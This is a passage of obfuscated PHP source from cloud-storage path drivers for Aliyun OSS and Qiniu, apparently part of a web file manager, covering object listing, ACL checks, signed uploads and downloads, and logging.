$ç¾•ÄÃ‚->getMessage()); break; } $Ó§ƒ©Œ¥ = $©¿Ø—³Â->getNextMarker(); $ŠèÀÒëÑ = $©¿Ø—³Â->getObjectList(); $ é¿úñŠ = $©¿Ø—³Â->getPrefixList(); if ($ŠâÃ©É¹) { if (count($ŠèÀÒëÑ) > 1 || count($ŠèÀÒëÑ) == 1 && $ŠèÀÒëÑ[0]->getKey() != $Ëè—™†) { $øÆÑç“Ç += count($ŠèÀÒëÑ) - 1; } if (!empty($ é¿úñŠ)) { $ğİôÜß× += count($ é¿úñŠ); } if ($Ó§ƒ©Œ¥ === $ÉŒ„åÑ[12]) { break; } continue; } if ($·ëÕô¼¸) { if (!empty($ŠèÀÒëÑ)) { if (count($ŠèÀÒëÑ) > 1 || $ŠèÀÒëÑ[0]->getKey() != $Ëè—™†) { return !0; } } } else { if (!empty($ é¿úñŠ)) { return !0; } } if ($Ó§ƒ©Œ¥ === $ÉŒ„åÑ[12]) { break; } } if ($ŠâÃ©É¹) { return array($ÉŒ„åÑ[249] => $øÆÑç“Ç, $ÉŒ„åÑ[250] => $ğİôÜß×); } return !1; } public function listAll($·÷ıâ¿¥) { $Õª©…Ê¶ =& $_SERVER[÷ôÚîå]; $§Èøµí¨ = $this->fileList($·÷ıâ¿¥, $Õª©…Ê¶[12], !0); $æŠ¿ÜÌ = array_to_keyvalue($§Èøµí¨[$Õª©…Ê¶[96]], $Õª©…Ê¶[32]); foreach ($§Èøµí¨[$Õª©…Ê¶[95]] as $•ïÃ„áú) { if (is_string($•ïÃ„áú)) { $æŠ¿ÜÌ[$•ïÃ„áú] = array($Õª©…Ê¶[89] => 0); } } return $this->listAllFiles($·÷ıâ¿¥, $æŠ¿ÜÌ); } public function canRead($ö…ÆÁß‹) { $‹àæíÁ =& $_SERVER[÷ôÚîå]; $Ä¾ÄÆ‚ú = $this->pathAcl($ö…ÆÁß‹); return $Ä¾ÄÆ‚ú == $‹àæíÁ[1492] || $Ä¾ÄÆ‚ú == $‹àæíÁ[628] ? !0 : !1; } public function canWrite($‹™”ö) { $ ¯«€†® = $this->pathAcl($‹™”ö); return $ ¯«€†® == $_SERVER[÷ôÚîå][628] ? !0 : !1; } public function pathAcl($öıÓî‹é) { $ê˜¾¡àÃ =& $_SERVER[÷ôÚîå]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $×ş—ª = $this->client->getObjectAcl($this->bucket, $this->pathEncode($öıÓî‹é)); } catch (OSS\Core\OssException $Ÿ§ÕáÒ¨) { $this->writeLog(__FUNCTION__ . $ê˜¾¡àÃ[224] . $Ÿ§ÕáÒ¨->getMessage()); return !1; } $Ó¡¥«àÏ = $×ş—ª == $ê˜¾¡àÃ[37] ? $this->bucketAcl : $×ş—ª; if ($Ó¡¥«àÏ == $ê˜¾¡àÃ[1493]) { return $ê˜¾¡àÃ[1492]; } if ($Ó¡¥«àÏ == $ê˜¾¡àÃ[1494]) { return $ê˜¾¡àÃ[628]; } return $Ó¡¥«àÏ; } private function chmodPath($™ôúä•Í, $‚‰ËÁïú = '') { $Ÿõâè¿¦ =& $_SERVER[÷ôÚîå]; $İÑ‘Î‰Ø = empty($‚‰ËÁïú) ? $Ÿõâè¿¦[1494] : $‚‰ËÁïú; $õ«“‚î = array($Ÿõâè¿¦[37], $Ÿõâè¿¦[239], $Ÿõâè¿¦[1493], $Ÿõâè¿¦[1494]); if (!in_array($İÑ‘Î‰Ø, $õ«“‚î)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($™ôúä•Í), $İÑ‘Î‰Ø); } catch (OSS\Core\OssException $„ÛÙ¾ò¬) { $this->writeLog(__FUNCTION__ . $Ÿõâè¿¦[224] . $„ÛÙ¾ò¬->getMessage()); return !1; } return !0; } public function getContent($É®Êœçˆ) { return $this->fileSubstr($É®Êœçˆ, -1); } public function setContent($™¿…ëØŞ, $í•é§ëô = '') { $ÕÉ±šÈÀ =& $_SERVER[÷ôÚîå]; try { $ù“ñëÁ· = $this->trafficLimit($ÕÉ±šÈÀ[1495]); $òÅ¤›Ø = $this->client->putObject($this->bucket, $this->pathEncode($™¿…ëØŞ), $í•é§ëô, $ù“ñëÁ·); } catch (OSS\Core\OssException $²‘°°ã) { $this->writeLog(__FUNCTION__ . $ÕÉ±šÈÀ[224] . $²‘°°ã->getMessage()); return !1; } $§«Şºøœ = array($ÕÉ±šÈÀ[1489] => trim($òÅ¤›Ø[$ÕÉ±šÈÀ[1486]], $ÕÉ±šÈÀ[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($™¿…ëØŞ))); $this->updateObjMeta($™¿…ëØŞ, $§«Şºøœ); return isset($òÅ¤›Ø[$ÕÉ±šÈÀ[1496]][$ÕÉ±šÈÀ[301]]) ? !0 : !1; } private function updateObjMeta($Õ¡¶Î®Ù, $ìåÔ°ìĞ) { $Õ¡¶Î®Ù = $this->pathEncode($Õ¡¶Î®Ù); try { $ˆ¡Öü‘ = array(OSS\OssClient::OSS_HEADERS => $ìåÔ°ìĞ); $this->client->copyObject($this->bucket, $Õ¡¶Î®Ù, $this->bucket, $Õ¡¶Î®Ù, $ˆ¡Öü‘); } catch (OSS\Core\OssException $´Ğ¾ñ¿) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $´Ğ¾ñ¿->getMessage()); return !1; } return !0; } public function upload($›¹ ¨‡ƒ, $ôáœÕº‘, $²íÈ¸¸â = false, $Ã¤ŞíÁ¾ = REPEAT_REPLACE) { $İÓ«ãŠç =& $_SERVER[÷ôÚîå]; $†ÖùÁÉÜ = trim($›¹ ¨‡ƒ, $İÓ«ãŠç[8]); $­È•Û¢ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($İÓ«ãŠç[1489] => @md5_file($ôáœÕº‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($›¹ ¨‡ƒ))); $­È•Û¢ = $this->trafficLimit($İÓ«ãŠç[1495], $­È•Û¢); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($†ÖùÁÉÜ), $ôáœÕº‘, $­È•Û¢); } catch (OSS\Core\OssException $«‡†İÈ½) { $this->writeLog(__FUNCTION__ . $İÓ«ãŠç[224] . $«‡†İÈ½->getMessage()); return !1; } return $this->getPathOuter($›¹ ¨‡ƒ); } public function getHost() { $–šÇ™ã =& $_SERVER[÷ôÚîå]; $ó©Ú›Œ„ = explode($–šÇ™ã[220], parent::getHost()); return $ó©Ú›Œ„[0] . $–šÇ™ã[220] . $this->bucket . $–šÇ™ã[10] . $ó©Ú›Œ„[1]; } public function uploadFormData($©‰µò°ò, $¹°ëá’ï = 3600) { $ÇÅ•­ï =& $_SERVER[÷ôÚîå]; if (!($®Ú‰Ø™¼ = $this->getHost())) { return !1; } $…´€»…ş = $¹°ëá’ï; $–î„‰¼û = date($ÇÅ•­ï[1497], time() + $…´€»…ş); $ ì­àØ‘ = new DateTime($–î„‰¼û); $¶¥’†• = $ ì­àØ‘->format(DateTime::ISO8601); $øî«—ı = strpos($¶¥’†•, $ÇÅ•­ï[381]); $¶¥’†• = substr($¶¥’†•, 0, $øî«—ı) . $ÇÅ•­ï[1498]; $ÔàÇƒ£· = 1048576000 * 5; $ÊéÄ²´ü = $this->pathFather($©‰µò°ò); $½‚§ºË = array($ÇÅ•­ï[284] => $¶¥’†•, $ÇÅ•­ï[287] => array(array($ÇÅ•­ï[1499], 0, $ÔàÇƒ£·), array($ÇÅ•­ï[290], $ÇÅ•­ï[291], $ÊéÄ²´ü))); $Â¨ã½û = base64_encode(json_encode($½‚§ºË)); $¨®â«Ó = base64_encode(hash_hmac($ÇÅ•­ï[272], $Â¨ã½û, $this->secret, !0)); $Ê¾¤³ø = array($ÇÅ•­ï[302] => $Â¨ã½û, $ÇÅ•­ï[1500] => $this->accessKey, $ÇÅ•­ï[294] => $ÇÅ•­ï[283], $ÇÅ•­ï[1501] => $¨®â«Ó, $ÇÅ•­ï[218] => $®Ú‰Ø™¼); $Ê¾¤³ø = $this->trafficLimit($ÇÅ•­ï[1495], $Ê¾¤³ø); return $Ê¾¤³ø; } public function multiUploadFormData($à˜—†¿Ì, $““û¦ã = 3600) { $Ø©…İ© =& $_SERVER[÷ôÚîå]; if (!($¯ç´ßìÛ = $this->getHost())) { return !1; } $¥ÏĞÚ¾€ = $this->trafficLimit($Ø©…İ©[1495]); $âˆ¢ì = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($à˜—†¿Ì), $¥ÏĞÚ¾€); return array($Ø©…İ©[264] => $âˆ¢ì, $Ø©…İ©[218] => $¯ç´ßìÛ . $Ø©…İ©[8] . $this->pathEncode($à˜—†¿Ì), $Ø©…İ©[265] => gmdate($Ø©…İ©[1502]), $Ø©…İ©[107] => $à˜—†¿Ì); } public function multiUploadAuthData($×¸ÌŞ™Œ, $”àÖäˆÆ = array()) { $ÏåßˆãĞ =& $_SERVER[÷ôÚîå]; $õÔçŠÛæ = isset($”àÖäˆÆ[$ÏåßˆãĞ[265]]) ? $”àÖäˆÆ[$ÏåßˆãĞ[265]] : gmdate($ÏåßˆãĞ[1502]); $ÅØ½Û = isset($”àÖäˆÆ[$ÏåßˆãĞ[179]]) ? $”àÖäˆÆ[$ÏåßˆãĞ[179]] : $ÏåßˆãĞ[12]; $’ä¦¿Ş” = $×¸ÌŞ™Œ; if (isset($”àÖäˆÆ[$ÏåßˆãĞ[107]])) { $’ä¦¿Ş” = $”àÖäˆÆ[$ÏåßˆãĞ[107]]; unset($”àÖäˆÆ[$ÏåßˆãĞ[107]]); } if (isset($”àÖäˆÆ[$ÏåßˆãĞ[266]])) { $”àÖäˆÆ[$ÏåßˆãĞ[265]] = $õÔçŠÛæ; return $this->listUploadParts($’ä¦¿Ş”, $”àÖäˆÆ); } $ÉĞçï¡ = array($ÏåßˆãĞ[267], $ÏåßˆãĞ[12], $ÏåßˆãĞ[133], $õÔçŠÛæ, "\x78\55\x6f\x73\x73\55\x64\x61\164\x65\x3a{$õÔçŠÛæ}", $ÏåßˆãĞ[8] . $this->bucket . $ÏåßˆãĞ[8] . $’ä¦¿Ş” . $ÅØ½Û); if (strpos($ÅØ½Û, $ÏåßˆãĞ[268]) === 0) { $ÉĞçï¡[0] = $ÏåßˆãĞ[269]; if ($ûÛ„ÜÒê = $this->trafficLimit($ÏåßˆãĞ[1495])) { $’ä¦¿Ş” = $ÏåßˆãĞ[1503]; array_splice($ÉĞçï¡, 5, 0, $’ä¦¿Ş” . $ÏåßˆãĞ[4] . $ûÛ„ÜÒê[$’ä¦¿Ş”]); } } if (isset($”àÖäˆÆ[$ÏåßˆãĞ[270]]) && $”àÖäˆÆ[$ÏåßˆãĞ[270]] == $ÏåßˆãĞ[271]) { $ÉĞçï¡[0] = $ÏåßˆãĞ[271]; } if (!empty($”àÖäˆÆ[$ÏåßˆãĞ[1504]])) { $ÙşĞ÷× = array_merge(array($ÉĞçï¡[4]), $”àÖäˆÆ[$ÏåßˆãĞ[1504]]); sort($ÙşĞ÷×); $ÉĞçï¡[4] = implode($ÏåßˆãĞ[65], $ÙşĞ÷×); } $êÑ¼¹Òì = implode($ÏåßˆãĞ[65], $ÉĞçï¡); $ì÷©á– = base64_encode(hash_hmac($ÏåßˆãĞ[272], $êÑ¼¹Òì, $this->secret, !0)); $ŒŞû‰“ = $ÏåßˆãĞ[1472] . $this->accessKey . $ÏåßˆãĞ[4] . $ì÷©á–; if (strpos($ÅØ½Û, $ÏåßˆãĞ[268]) === 0) { $ŒŞû‰“ = array($ÏåßˆãĞ[274] => $ŒŞû‰“, $ÏåßˆãĞ[265] => $õÔçŠÛæ); if ($ûÛ„ÜÒê) { $ŒŞû‰“ = array_merge($ŒŞû‰“, $ûÛ„ÜÒê); } } return $ŒŞû‰“; } public function listUploadParts($±ÉÄ·´Ï, $òÁ¿Ûö”) { $Ûøœ·Çë =& $_SERVER[÷ôÚîå]; $ÇŸŸÁõ = parse_url_query($òÁ¿Ûö”[$Ûøœ·Çë[179]]); $è«§‰±‰ = $this->client->listParts($this->bucket, $this->pathEncode($±ÉÄ·´Ï), $ÇŸŸÁõ[$Ûøœ·Çë[264]]); $èÄØßú = $è«§‰±‰->getListPart(); $÷äàÆ’ = array(); foreach ($èÄØßú as $¸¸°„Ê) { $÷äàÆ’[] = array($Ûøœ·Çë[317] => $¸¸°„Ê->getPartNumber(), $Ûøœ·Çë[318] => trim($¸¸°„Ê->getETag(), $Ûøœ·Çë[131])); } unset($òÁ¿Ûö”[$Ûøœ·Çë[266]], $òÁ¿Ûö”[$Ûøœ·Çë[270]]); $‰í“£äæ = $this->multiUploadAuthData($±ÉÄ·´Ï, $òÁ¿Ûö”); if (empty($‰í“£äæ)) { return !1; } return array($Ûøœ·Çë[274] => $‰í“£äæ, $Ûøœ·Çë[265] => $òÁ¿Ûö”[$Ûøœ·Çë[265]], $Ûøœ·Çë[276] => $÷äàÆ’); } public function download($Ì‡Ø†, $¬ã¾Ú°Æ) { $êéİ«ã— =& $_SERVER[÷ôÚîå]; if ($this->isFolder($Ì‡Ø†)) { return !1; } try { $Ìñ®Î¨¶ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¬ã¾Ú°Æ); $Ìñ®Î¨¶ = $this->trafficLimit($êéİ«ã—[122], $Ìñ®Î¨¶); $this->client->getObject($this->bucket, $this->pathEncode($Ì‡Ø†), $Ìñ®Î¨¶); } catch (OSS\Core\OssException $ã³ï÷) { $this->writeLog(__FUNCTION__ . $êéİ«ã—[224] . $ã³ï÷->getMessage()); return !1; } return $¬ã¾Ú°Æ; } public function fileSubstr($†˜Œ£âÆ, $£³¬ Ç = 0, $‰ÖÂ³·î = false) { if ($£³¬ Ç === -1) { $ñ¥Õ›Ş¸ = array(); } else { if ($‰ÖÂ³·î === !1) { $ë‡¦ï¯Ö = $this->size($†˜Œ£âÆ); } else { $ë‡¦ï¯Ö = $£³¬ Ç + $‰ÖÂ³·î - 1; } $ñ¥Õ›Ş¸ = array(OSS\OssClient::OSS_RANGE => "{$£³¬ Ç}\x2d{$ë‡¦ï¯Ö}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($†˜Œ£âÆ), $ñ¥Õ›Ş¸); } catch (OSS\Core\OssException $Ç²“Ú¢Ü) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $Ç²“Ú¢Ü->getMessage()); think_exception($Ç²“Ú¢Ü->getMessage()); return !1; } } private function trafficLimit($Ğ²Ù½å¸, $†»î™éì = array()) { $¾÷®´Ğ =& $_SERVER[÷ôÚîå]; if ($Ğ²Ù½å¸ == $¾÷®´Ğ[1495] && $this->isUploadServer() || $Ğ²Ù½å¸ == $¾÷®´Ğ[122] && $this->isFileOutServer()) { return $†»î™éì; } $²–™‹‚Ë = floatval($GLOBALS[$¾÷®´Ğ[6]][$¾÷®´Ğ[102]][$¾÷®´Ğ[120]][$Ğ²Ù½å¸]) * 1024 * 1024 * 8; if (!$²–™‹‚Ë) { return $†»î™éì; } $²–™‹‚Ë = $²–™‹‚Ë < 819200 ? 819200 : ($²–™‹‚Ë > 838860800 ? 838860800 : $²–™‹‚Ë); $†»î™éì[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($²–™‹‚Ë); return $†»î™éì; } public function link($ÇüÎÓ»ê, $ä’Éäè = array()) { $Ô³†¢”­ =& $_SERVER[÷ôÚîå]; if (!$this->exist($ÇüÎÓ»ê) || $this->isFolder($ÇüÎÓ»ê)) { return !1; } try { $ä’Éäè = $this->trafficLimit($Ô³†¢”­[122], $ä’Éäè); $Šëúõ‘¶ = $this->client->signUrl($this->bucket, $this->pathEncode($ÇüÎÓ»ê), 3600 * 12, $Ô³†¢”­[271], $ä’Éäè); return $this->getCdnLink($Šëúõ‘¶); } catch (OSS\Core\OssException $êêÉóı¥) { $this->writeLog(__FUNCTION__ . $Ô³†¢”­[224] . $êêÉóı¥->getMessage()); return !1; } } public function fileOut($Îï‹„¹, $§î‘µ¤ç = false, $îÕ·ÌŸ© = false, $ºéÓ¼ÔÔ = '') { $Š¾®¤á¤ =& $_SERVER[÷ôÚîå]; if ($this->isFileOutServer()) { return $this->fileOutServer($Îï‹„¹, $§î‘µ¤ç, $îÕ·ÌŸ©, $ºéÓ¼ÔÔ); } if (!$îÕ·ÌŸ©) { $îÕ·ÌŸ© = $this->pathThis($Îï‹„¹); } $îÕ·ÌŸ© = rawurlencode($îÕ·ÌŸ©); $Çó—²†¡ = get_file_mime(get_path_ext($îÕ·ÌŸ©)); if ($Çó—²†¡ == $Š¾®¤á¤[258]) { return parent::fileOut($Îï‹„¹, $§î‘µ¤ç, $îÕ·ÌŸ©, $ºéÓ¼ÔÔ); } $§î‘µ¤ç = $§î‘µ¤ç ? $Š¾®¤á¤[1505] : $Š¾®¤á¤[1506]; $ÉıùÒç = array(OSS\OssClient::OSS_SUB_RESOURCE => $Š¾®¤á¤[1507] . rawurlencode("{$§î‘µ¤ç}\x3b\146\x69\x6c\145\x6e\x61\155\145\75{$îÕ·ÌŸ©}")); $ÉıùÒç[OSS\OssClient::OSS_SUB_RESOURCE] .= $Š¾®¤á¤[1508] . rawurlencode($Çó—²†¡); $·ìˆõé = $this->link($Îï‹„¹, $ÉıùÒç); $this->fileOutLink($·ìˆõé); } public function fileOutServer($ÏŸï´³ê, $Í„ü€«è = false, $“²Î–¤ = false, $öû—“– = '') { parent::fileOut($ÏŸï´³ê, $Í„ü€«è, $“²Î–¤, $öû—“–); } public function fileOutImage($Œß £‚‚, $ı‘”ı°î = 250) { if ($this->size($Œß £‚‚) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Œß £‚‚, $ı‘”ı°î); } $ÄÚ´Å“Å = array(OSS\OssClient::OSS_PROCESS => $_SERVER[÷ôÚîå][1469] . $ı‘”ı°î); $¨üÍåîê = $this->link($Œß £‚‚, $ÄÚ´Å“Å); $this->fileOutLink($¨üÍåîê); } public function fileOutImageServer($ÉğåöÎµ, $ıÕÔäŞ¾ = 250) { parent::fileOutImage($ÉğåöÎµ, $ıÕÔäŞ¾); } public function fileOutLink($Âİ¹øÁ´) { $ÏùÓµÔÑ =& $_SERVER[÷ôÚîå]; if (!$this->isCdnHost() && substr($Âİ¹øÁ´, 0, 7) == $ÏùÓµÔÑ[322]) { $Âİ¹øÁ´ = $ÏùÓµÔÑ[323] . substr($Âİ¹øÁ´, 7); } header($ÏùÓµÔÑ[185] . $Âİ¹øÁ´); die; } public function hashMd5($ƒáØ´Ì, $·Ë‡‰ƒ = '') { $³¨ş€‡ =& $_SERVER[÷ôÚîå]; $Ÿ“ÁáÌ÷ = $this->_objectMeta($ƒáØ´Ì); if (!$Ÿ“ÁáÌ÷) { return $³¨ş€‡[12]; } if (!isset($Ÿ“ÁáÌ÷[$³¨ş€‡[1489]]) && !empty($·Ë‡‰ƒ)) { $¤§Ä²ğ½ = $this->updateObjMeta($ƒáØ´Ì, array($³¨ş€‡[1489] => $·Ë‡‰ƒ)); $Ÿ“ÁáÌ÷[$³¨ş€‡[1489]] = $¤§Ä²ğ½ ? $·Ë‡‰ƒ : $³¨ş€‡[12]; } return isset($Ÿ“ÁáÌ÷[$³¨ş€‡[1489]]) ? strtolower($Ÿ“ÁáÌ÷[$³¨ş€‡[1489]]) : $³¨ş€‡[12]; } public function size($Ì•î¥íÃ) { $¼£Ëî†¬ = $this->objectMeta($Ì•î¥íÃ); return $¼£Ëî†¬ ? $¼£Ëî†¬[$_SERVER[÷ôÚîå][89]] : 0; } public function info($’ìû—¦è) { if ($this->isFolder($’ìû—¦è)) { return $this->folderInfo($’ìû—¦è); } else { if ($this->isFile($’ìû—¦è)) { return $this->fileInfo($’ìû—¦è); } } return !1; } public function exist($Ò†Å’Åô) { return $this->isFile($Ò†Å’Åô) || $this->isFolder($Ò†Å’Åô); } public function isFile($Œ­§ƒà©) { return !$this->isFolder($Œ­§ƒà©) && $this->objectMeta($Œ­§ƒà©); } public function isFolder($¿ò“ğŒ) { return $this->cacheMethod($_SERVER[÷ôÚîå][189], $¿ò“ğŒ); } protected function objectMeta($ùíê„‚¹) { return $this->cacheMethod($_SERVER[÷ôÚîå][191], $ùíê„‚¹); } protected function _objectMeta($ùÛŸı) { $õ¼‰±¨ =& $_SERVER[÷ôÚîå]; try { $¼·¥¼˜ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ùÛŸı)); } catch (OSS\Core\OssException $—‚üïä) { $this->writeLog(__FUNCTION__ . $õ¼‰±¨[224] . $—‚üïä->getMessage()); $¼·¥¼˜ = !1; } if ($¼·¥¼˜) { $¼·¥¼˜[$õ¼‰±¨[89]] = intval($¼·¥¼˜[$õ¼‰±¨[1487]]); } return $¼·¥¼˜; } protected function _isFolder($ë‰”‘ÚÙ) { $üÎâ®…Ò =& $_SERVER[÷ôÚîå]; if ($ë‰”‘ÚÙ == $üÎâ®…Ò[12] || $ë‰”‘ÚÙ == $üÎâ®…Ò[8]) { return !0; } $Ô¡•ãóù = array($üÎâ®…Ò[1482] => $üÎâ®…Ò[8], $üÎâ®…Ò[1483] => rtrim($ë‰”‘ÚÙ, $üÎâ®…Ò[8]) . $üÎâ®…Ò[8], $üÎâ®…Ò[1484] => 1, $üÎâ®…Ò[1485] => $üÎâ®…Ò[12]); $Ó÷®…ƒ = $this->client->listObjects($this->bucket, $Ô¡•ãóù); if ($Ó÷®…ƒ->getObjectList() || $Ó÷®…ƒ->getPrefixList()) { return !0; } return !1; } public function writeLog($ªÍˆË¿  = '', $­–ßÂÁê = false) { $ä§“ÖÏû =& $_SERVER[÷ôÚîå]; $Ú÷ÄÚÚÌ = in_array(ACTION, array($ä§“ÖÏû[222], $ä§“ÖÏû[223])); if (!$Ú÷ÄÚÚÌ && !GLOBAL_DEBUG) { return; } $¨ğÔÂîæ = 0; if (stripos($ªÍˆË¿ , $ä§“ÖÏû[1509]) !== !1) { $¨ğÔÂîæ = 1; $µ’Â¨–¤ = explode($ä§“ÖÏû[1510], $ªÍˆË¿ ); $ªÍˆË¿  = !empty($µ’Â¨–¤[1]) ? $µ’Â¨–¤[1] : $ªÍˆË¿ ; } else { if (stripos($ªÍˆË¿ , $ä§“ÖÏû[1511])) { $¨ğÔÂîæ = 2; $µ’Â¨–¤ = explode($ä§“ÖÏû[1511], $ªÍˆË¿ ); $µ’Â¨–¤ = explode($ä§“ÖÏû[4], $µ’Â¨–¤[0]); $ªÍˆË¿  = !empty($µ’Â¨–¤[1]) ? $µ’Â¨–¤[1] : $ªÍˆË¿ ; } } if ($Ú÷ÄÚÚÌ && I18n::getType() == $ä§“ÖÏû[1512]) { if ($¨ğÔÂîæ == 1) { $ªÍˆË¿  = str_replace($ä§“ÖÏû[1513], $ä§“ÖÏû[1514], $ªÍˆË¿ ); } else { if ($¨ğÔÂîæ == 2) { $µ’Â¨–¤ = explode($ä§“ÖÏû[224], $µ’Â¨–¤[0]); $ÂÛÉ¥ñ¥ = isset($µ’Â¨–¤[1]) ? $µ’Â¨–¤[1] : $ä§“ÖÏû[12]; $Úü°äĞè = array($ä§“ÖÏû[1515] => $ä§“ÖÏû[1516], $ä§“ÖÏû[1517] => $ä§“ÖÏû[1518], $ä§“ÖÏû[1519] => $ä§“ÖÏû[1520], $ä§“ÖÏû[1521] => $ä§“ÖÏû[1522], $ä§“ÖÏû[1523] => $ä§“ÖÏû[1524], $ä§“ÖÏû[1525] => $ä§“ÖÏû[1526], $ä§“ÖÏû[1527] => $ä§“ÖÏû[1528], $ä§“ÖÏû[1529] => $ä§“ÖÏû[1530], $ä§“ÖÏû[1531] => $ä§“ÖÏû[1532], $ä§“ÖÏû[1533] => $ä§“ÖÏû[1534]); if (isset($Úü°äĞè[$ÂÛÉ¥ñ¥])) { $ªÍˆË¿  = $Úü°äĞè[$ÂÛÉ¥ñ¥]; } } } if (stripos($ªÍˆË¿ , $ä§“ÖÏû[1535])) { $ªÍˆË¿  = $ä§“ÖÏû[1536]; } } if (!trim($ªÍˆË¿ )) { return; } parent::writeLog(trim($ªÍˆË¿ ), $­–ßÂÁê); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($©õïæ»ó) { parent::__construct(); require_once SDK_DIR . $_SERVER[÷ôÚîå][1537]; $this->_init($©õïæ»ó); } public function _init($€·÷ã¤—) { $¾ô ˜Æ =& $_SERVER[÷ôÚîå]; $this->config = $€·÷ã¤—; foreach ($€·÷ã¤— as $é¥¯š¥ó => $¼Ğ÷„ÔÉ) { if (isset($this->{$é¥¯š¥ó})) { $this->{$é¥¯š¥ó} = $¼Ğ÷„ÔÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¾ô ˜Æ[1538] . LNG($¾ô ˜Æ[1473])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¡Ú­åàª, $„ôÍÓí’ = '', $µú´üÜ = REPEAT_RENAME) { if ($this->setContent($¡Ú­åàª, $„ôÍÓí’)) { return $this->getPathOuter($¡Ú­åàª); } return !1; } public function mkdir($“ÌÒß¤, $ë»îô¦Ã = REPEAT_SKIP) { $½Èé¤á =& $_SERVER[÷ôÚîå]; $¸Üî³à— = trim($“ÌÒß¤, $½Èé¤á[8]); if ($this->_isFolder($¸Üî³à—)) { return $this->getPathOuter($¸Üî³à—); } $“ÌÒß¤ = $¸Üî³à— . $½Èé¤á[8]; $ÊŞ‰®•Ã = get_path_this($¸Üî³à—); $›–¹³Ï‹ = $“ÌÒß¤ . $ÊŞ‰®•Ã; if (!$this->mkfile($›–¹³Ï‹)) { return !1; } if (!$this->moveFile($›–¹³Ï‹, $“ÌÒß¤)) { $this->delFile($›–¹³Ï‹); return !1; } return $this->getPathOuter($¸Üî³à—); } public function copyFile($Æ³óê§¢, $¦à‡ĞÙ) { $Ù¸¹ÁÅ = $this->bucketManager->copy($this->bucket, $Æ³óê§¢, $this->bucket, $¦à‡ĞÙ, !0); return $Ù¸¹ÁÅ ? !1 : $this->getPathOuter($¦à‡ĞÙ); } public function moveFile($¿ÎÀ§§, $…·š€ºê) { $¼é‡Ñ£² = $this->bucketManager->move($this->bucket, $¿ÎÀ§§, $this->bucket, $…·š€ºê, !0); return $¼é‡Ñ£² ? !1 : $this->getPathOuter($…·š€ºê); } public function delFile($ÀôÒŒ‰¥) { if (!$this->exist($ÀôÒŒ‰¥)) { return !0; } $Ÿ¾Ä’Ğ• = $this->bucketManager->delete($this->bucket, $ÀôÒŒ‰¥); return $Ÿ¾Ä’Ğ• ? !1 : !0; } public function delFolder($£Æ²¸‹®) { $Ûàñ­Ã£ =& $_SERVER[÷ôÚîå]; if (!$this->exist($£Æ²¸‹®)) { return !0; } $this->listItemCache = !1; $ôöˆ˜ì¬ = $this->fileList($£Æ²¸‹®); $this->listItemCache = !0; $şåšú«‡ = trim($£Æ²¸‹®, $Ûàñ­Ã£[8]) . $Ûàñ­Ã£[8]; if (!empty($£Æ²¸‹®) && $£Æ²¸‹® !== $Ûàñ­Ã£[238] && !in_array($şåšú«‡, $ôöˆ˜ì¬[$Ûàñ­Ã£[95]])) { $ôöˆ˜ì¬[$Ûàñ­Ã£[95]][] = $şåšú«‡; } $Óˆ÷¥¥¦ = $this->delByBatch($ôöˆ˜ì¬[$Ûàñ­Ã£[96]]); if (!$Óˆ÷¥¥¦) { return !1; } $Óˆ÷¥¥¦ = $this->delByBatch($ôöˆ˜ì¬[$Ûàñ­Ã£[95]]); if (!$Óˆ÷¥¥¦) { return !1; } return $this->delFile($şåšú«‡); } private function delByBatch($—°Ó“ªĞ) { foreach (array_chunk($—°Ó“ªĞ, 1000) as $‹Ù©Ûİ) { $è•š—ä = $this->bucketManager->buildBatchDelete($this->bucket, $‹Ù©Ûİ); list($–§Í÷·›, $ğøè–’‰) = $this->bucketManager->batch($è•š—ä); if ($ğøè–’‰) { return !1; } } return !0; } public function rename($ØÄÆÉæÊ, $¿öÍš°÷) { return $this->renameObject($ØÄÆÉæÊ, $¿öÍš°÷); } public function fileInfo($¦ºÃĞÖå, $¦ú÷ÄÃ = false, $ÏË°¿ÂÊ = array()) { $ª êüÙ½ =& $_SERVER[÷ôÚîå]; $Â“›Ë“Ú = array($ª êüÙ½[32] => $this->pathThis($¦ºÃĞÖå), $ª êüÙ½[97] => $this->getPathOuter($ª êüÙ½[8] . $¦ºÃĞÖå), $ª êüÙ½[33] => $ª êüÙ½[240], $ª êüÙ½[89] => isset($ÏË°¿ÂÊ[$ª êüÙ½[1539]]) ? $ÏË°¿ÂÊ[$ª êüÙ½[1539]] : 0, $ª êüÙ½[179] => $this->ext($¦ºÃĞÖå)); if ($¦ú÷ÄÃ) { return $Â“›Ë“Ú; } $Â“›Ë“Ú[$ª êüÙ½[241]] = $Â“›Ë“Ú[$ª êüÙ½[98]] = 0; $Â“›Ë“Ú[$ª êüÙ½[242]] = $Â“›Ë“Ú[$ª êüÙ½[243]] = !0; if (empty($ÏË°¿ÂÊ)) { $ÏË°¿ÂÊ = $this->objectMeta($¦ºÃĞÖå); if (!$ÏË°¿ÂÊ) { return $Â“›Ë“Ú; } } if (isset($ÏË°¿ÂÊ[$ª 